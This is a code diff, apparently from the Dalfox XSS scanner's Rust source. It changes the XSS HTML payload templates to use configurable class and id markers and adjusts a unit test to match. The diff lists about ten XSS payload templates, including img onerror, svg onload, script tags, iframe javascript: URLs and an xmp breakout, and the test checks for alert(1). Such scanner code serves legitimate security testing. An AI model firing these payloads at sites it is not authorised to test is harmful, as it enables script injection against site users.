@@ -14,22 +14,25 @@ pub fn useful_html_tag_names() -> &'static [&'static str] {
 pub fn get_dynamic_xss_html_payloads() -> Vec<String> {
     let templates = [
         // CLASS
-        "<IMG src=x onerror={JS} ClAss=dalfox>",
-        "<sVg onload={JS} claSS=dalfox>",
-        "<sCrIpt/cLaSs=dalfox>{JS}</scRipT>",
-        "<xmp><p title=\"</xmp><svg/onload={JS}) class=dalfox>",
-        "<details open ontoggle={JS} class=dalfox>",
-        "<iFrAme/src=JaVAsCrIPt:{JS} ClAss=dalfox>",
-        "</<a/href='><svg/onload={JS} claSS=dalfox>'>",
+        "<IMG src=x onerror={JS} ClAss={CLASS}>",
+        "<sVg onload={JS} claSS={CLASS}>",
+        "<sCrIpt/cLaSs={CLASS}>{JS}</scRipT>",
+        "<xmp><p title=\"</xmp><svg/onload={JS}) class={CLASS}>",
+        "<details open ontoggle={JS} class={CLASS}>",
+        "<iFrAme/src=JaVAsCrIPt:{JS} ClAss={CLASS}>",
+        "</<a/href='><svg/onload={JS} claSS={CLASS}>'>",
         // ID
-        "<IMG src=x onerror={JS} id=dalfox>",
-        "<sVg onload={JS} iD=dalfox>",
-        "<sCrIpt/ID=dalfox>{JS}</scRipT>",
+        "<IMG src=x onerror={JS} id={ID}>",
+        "<sVg onload={JS} iD={ID}>",
+        "<sCrIpt/ID={ID}>{JS}</scRipT>",
     ];
     let mut out = Vec::new();
     for js in crate::payload::XSS_JAVASCRIPT_PAYLOADS_SMALL.iter() {
         for tmpl in templates.iter() {
-            out.push(tmpl.replace("{JS}", js));
+            let with_js = tmpl.replace("{JS}", js);
+            let with_class = with_js.replace("{CLASS}", crate::scanning::markers::class_marker());
+            let with_id = with_class.replace("{ID}", crate::scanning::markers::id_marker());
+            out.push(with_id);
         }
     }
     out
@@ -48,13 +51,15 @@ mod tests {
     #[test]
     fn test_get_dynamic_xss_html_payloads_contains_markers_and_js() {
         let payloads = get_dynamic_xss_html_payloads();
+        let cls = crate::scanning::markers::class_marker().to_lowercase();
+        let idm = crate::scanning::markers::id_marker().to_lowercase();
         let has_class = payloads
             .iter()
-            .any(|p| p.to_lowercase().contains("class=dalfox"));
+            .any(|p| p.to_lowercase().contains(&format!("class={}", cls)));
         let has_id = payloads
             .iter()
-            .any(|p| p.to_lowercase().contains("id=dalfox"));
-        assert!(has_class || has_id, "should contain class/id dalfox marker");
+            .any(|p| p.to_lowercase().contains(&format!("id={}", idm)));
+        assert!(has_class || has_id, "should contain class/id marker");
         let has_alert = payloads
             .iter()
             .any(|p| p.to_lowercase().contains("alert(1)"));
